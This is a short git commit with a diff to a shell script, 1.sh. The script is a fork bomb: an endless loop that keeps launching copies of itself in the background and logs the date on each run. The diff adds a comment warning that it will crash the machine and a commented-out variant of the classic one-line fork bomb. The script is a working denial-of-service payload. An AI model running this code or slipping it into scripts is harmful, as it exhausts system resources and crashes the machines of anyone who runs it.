10d260b5da161360b0ccd95c1b7cb03260fe369c
Ayman Nedjmeddine <theycallmethedr@gmail.com>
2017-04-20 20:37:12 +0100

    better

--- 1.sh
+++ 1.sh
@@ -1,6 +1,11 @@
 #!/usr/bin/bash
 
+# WARNING:   THIS WILL CRASH YOUR MACHINE
+
 # log the execution time and date
 echo `date` >> log
 # launch another instance of this script in the background
 while true; do bash $0 &; done
+
+# yet better
+# ;(:|;&);:
